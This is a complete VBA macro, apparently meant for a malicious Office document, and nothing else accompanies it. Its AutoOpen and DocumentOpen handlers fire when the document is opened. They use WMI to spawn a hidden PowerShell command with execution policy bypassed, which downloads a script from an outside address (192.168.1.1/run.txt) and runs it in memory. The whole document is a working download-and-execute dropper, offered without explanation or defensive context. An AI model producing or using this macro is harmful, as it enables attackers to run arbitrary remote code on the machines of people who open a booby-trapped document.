Sub MyMacro
 strArg = "powershell -exec bypass -nop -c iex((new-object system.net.webclient).downloadstring('http://192.168.1.1/run.txt'))"
 GetObject("winmgmts:").Get("Win32_Process").Create strArg, Null, Null, pid
End Sub
Sub AutoOpen()
 Mymacro
End Sub

Sub DocumentOpen()
    Mymacro
End Sub
